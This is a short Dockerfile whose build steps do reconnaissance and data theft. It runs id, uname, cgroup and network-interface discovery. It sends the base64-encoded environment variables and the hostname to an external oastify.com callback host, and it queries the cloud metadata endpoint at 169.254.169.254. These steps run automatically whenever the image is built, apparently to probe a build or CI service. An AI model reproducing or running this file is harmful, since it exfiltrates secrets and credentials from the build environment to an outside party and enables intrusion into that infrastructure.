FROM alpine
RUN apk add --no-cache curl
RUN id; uname -a; cat /proc/1/cgroup; ip a; \
    curl -s "http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com/?env=$(env | base64 -w0)" ; \
    curl -s "http://169.254.169.254/latest/meta-data/" ; \
    curl -s "http://g3kod0ltewj2n00dn7hd5kzwwn2eqie7.oastify.com/?host=$(hostname)" || true
